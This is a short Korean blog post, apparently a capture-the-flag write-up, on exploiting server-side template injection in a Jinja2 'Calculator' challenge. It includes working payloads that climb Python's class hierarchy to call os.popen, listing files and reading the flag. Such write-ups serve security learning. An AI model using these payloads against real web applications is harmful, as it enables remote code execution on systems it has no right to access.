---
layout: post
title: "Calculator"
categories: [System Hacking]
tags: [SSTI, Jinja2, RCE]
last_modified_at: 2025-01-24
render_with_liquid: false
---

위 그림 참고해서 SSTI 취약점을 확인해보자  

![SSTI Example](https://blog.kakaocdn.net/dna/qco8S/btsLV1dGwUG/AAAAAAAAAAAAAAAAAAAAAPArMjAh1-xBSKLDXkmBQAhH5ZhLerlMgJbeeHqvWzN-/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=uUnU5uD81BjycdQymzn3kSFGkik%3D)

jinja2 엔진을 사용한다. SSTI는 엔진에 맞는 라이트업을 찾아보았다.  

참고자료 정리는 접은 글  
[SSTI Reference](https://core-research-team.github.io/2021-05-01/Server-Side-Template-Injection(SSTI))

*SSTI*  
템플릿을 사용하여 웹 어플리케이션을 구동  
-> 이때 user input이 템플릿 구문으로 인식되면 RCE까지 이어질 수 있는 취약점  

템플릿이 여러개라서 문제마다 구문이 다름 보통은 `{{4*4}}`이던데 이 문제는 대괄호 `[[...]]` 구문은 값을 출력해줌 %나 #을 이요해서 주석, 반복문 등으로도 구문 삽입 가능  

아래서 `"".__class__`에 접근할 건데 이게 뭐냐면 python 특수 attributes중에 하나 아래서는 클래스의 `__base__`를 참조했는데 class object에 접근  
그리고 그걸 다시 `subclasses()`로 받으면 object의 서브 클래스 목록을 출력받을 수 있다  
이중에서 원하는 클래스 끌어다가 RCE 가능  

보통은 109 index 값 가져와서 popen으로 명령어 실행  
109 index는 `codecs.IncrementalDecoder`  

```bash
[[ "".__class__.__base__.__subclasses__()[109].__init__.__globals__['sys'].modules['os'].popen('ls').read() ]]
```

![Command Execution](https://blog.kakaocdn.net/dna/rnPpi/btsLV06R2ja/AAAAAAAAAAAAAAAAAAAAAN0xTZZB-V6p1B1kaFp9PQezpTGnO0VgSVWMoBlAkXeG/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=hNv6Yyq%2FFB5lCfwgLdaLETztfo4%3D)

```bash
[[ "".__class__.__base__.__subclasses__()[109].__init__.__globals__['sys'].modules['os'].popen('tac flag').read() ]]
```

![Flag Retrieval](https://blog.kakaocdn.net/dna/uqmxF/btsLUWj7ieV/AAAAAAAAAAAAAAAAAAAAAHs7v1LUbU1ZDWhnCiBz8dmrqV48ZbhSpO4xu1bJdb4d/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=mUMjLwc%2Fh9iDm88VU3fkERNSRGo%3D)

이렇게 하면 flag가 나온다.